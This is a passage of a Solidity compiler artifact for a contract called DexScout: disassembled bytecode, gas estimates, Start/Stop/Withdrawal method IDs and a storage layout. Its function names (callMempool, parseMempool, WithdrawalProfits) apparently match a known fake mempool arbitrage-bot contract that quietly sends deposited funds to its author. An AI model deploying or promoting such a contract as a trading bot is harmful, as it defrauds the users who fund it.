PUSH2 0xA50 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x53746F7070696E6720636F6E747261637420626F742E2E2E0000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0xAC4 PUSH1 0x18 DUP4 PUSH2 0x964 JUMP JUMPDEST SWAP2 POP PUSH2 0xACF DUP3 PUSH2 0xA90 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0xAF1 DUP2 PUSH2 0xAB8 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xB4E DUP3 PUSH2 0xAF8 JUMP JUMPDEST SWAP2 POP PUSH2 0xB59 DUP4 PUSH2 0xAF8 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 MUL PUSH2 0xB67 DUP2 PUSH2 0xAF8 JUMP JUMPDEST SWAP2 POP DUP3 DUP3 DIV DUP5 EQ DUP4 ISZERO OR PUSH2 0xB7E JUMPI PUSH2 0xB7D PUSH2 0xB17 JUMP JUMPDEST JUMPDEST POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x32 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xBC5 DUP3 PUSH2 0xBB2 JUMP JUMPDEST SWAP2 POP PUSH2 0xBD0 DUP4 PUSH2 0xBB2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP DUP1 DUP3 GT ISZERO PUSH2 0xBE8 JUMPI PUSH2 0xBE7 PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xBF8 DUP3 PUSH2 0xAF8 JUMP JUMPDEST SWAP2 POP PUSH2 0xC03 DUP4 PUSH2 0xAF8 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xC2F JUMPI PUSH2 0xC2E PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xC3F DUP3 PUSH2 0xAF8 JUMP JUMPDEST SWAP2 POP PUSH2 0xC4A DUP4 PUSH2 0xAF8 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xC76 JUMPI PUSH2 0xC75 PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xC86 DUP3 PUSH2 0xBB2 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0xCB8 JUMPI PUSH2 0xCB7 PUSH2 0xB17 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xCFA DUP3 PUSH2 0xBB2 JUMP JUMPDEST SWAP2 POP PUSH2 0xD05 DUP4 PUSH2 0xBB2 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0xD15 JUMPI PUSH2 0xD14 PUSH2 0xCC3 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xD57 DUP3 PUSH2 0xBB2 JUMP JUMPDEST SWAP2 POP PUSH2 0xD62 DUP4 PUSH2 0xBB2 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0xD72 JUMPI PUSH2 0xD71 PUSH2 0xCC3 JUMP JUMPDEST JUMPDEST DUP3 DUP3 MOD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xD87 DUP3 PUSH2 0xBB2 JUMP JUMPDEST SWAP2 POP PUSH2 0xD92 DUP4 PUSH2 0xBB2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0xDAA JUMPI PUSH2 0xDA9 PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xDC6 DUP3 PUSH2 0xDB0 JUMP JUMPDEST SWAP2 POP PUSH2 0xDD1 DUP4 PUSH2 0xDB0 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0xDEA JUMPI PUSH2 0xDE9 PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xDFA DUP3 PUSH2 0xDB0 JUMP JUMPDEST SWAP2 POP PUSH2 0xE05 DUP4 PUSH2 0xDB0 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0xE1E JUMPI PUSH2 0xE1D PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH13 0x80F4E5CF96E933CD2B698B342D 0xB5 MULMOD 0xD2 0xB6 SWAP15 PUSH6 0xDC2BEB3D7313 0xAD 0xA9 BLOBBASEFEE PUSH28 0x8D4E64736F6C634300081A0033000000000000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "734800",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"Start()": "infinite",
						"Stop()": "1938",
						"Withdrawal()": "infinite"
					},
					"internal": {
						"WithdrawalProfits()": "infinite",
						"_calculateGasNeeds()": "22",
						"_callDexAction()": "infinite",
						"beyond(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
						"calcLiquidityInContract(struct DexScout.slice memory)": "infinite",
						"callMempool()": "infinite",
						"checkLiquidity(uint256)": "infinite",
						"findNewContracts(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
						"findPtr(uint256,uint256,uint256,uint256)": "infinite",
						"getMemPoolDepth()": "22",
						"getMemPoolHeight()": "22",
						"getMemPoolLength()": "infinite",
						"getMemPoolOffset()": "22",
						"keccak(struct DexScout.slice memory)": "infinite",
						"loadCurrentContract(string memory)": "infinite",
						"mempool(string memory,string memory)": "infinite",
						"nextContract(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
						"orderContractsByLiquidity(struct DexScout.slice memory)": "infinite",
						"parseMempool(string memory)": "infinite",
						"toHexDigit(uint8)": "infinite",
						"uint2str(uint256)": "infinite"
					}
				},
				"methodIdentifiers": {
					"Start()": "1b55ba3a",
					"Stop()": "bedf0f4a",
					"Withdrawal()": "70e44c6a"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 8,
						"contract": "dexscout.sol:DexScout",
						"label": "_RouterAddress",
						"offset": 0,
						"slot": "0",
						"type": "t_string_storage"
					},
					{
						"astId": 10,
						"contract": "dexscout.sol:DexScout",
						"label": "_Network",
						"offset": 0,
						"slot": "1",
						"type": "t_string_storage"
					},
					{
						"astId": 12,
						"contract": "dexscout.sol:DexScout",
						"label": "liquidity",
						"offset": 0,
						"slot": "2",
						"type": "t_uint256"
					}
				],
				"types": {
					"t_string_storage": {
						"encoding": "bytes",
						"label": "string",
						"numberOfBytes": "32"
					},
					"t_uint256": {
						"encoding": "inplace",
						"label": "uint256",
						"numberOfBytes": "32"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}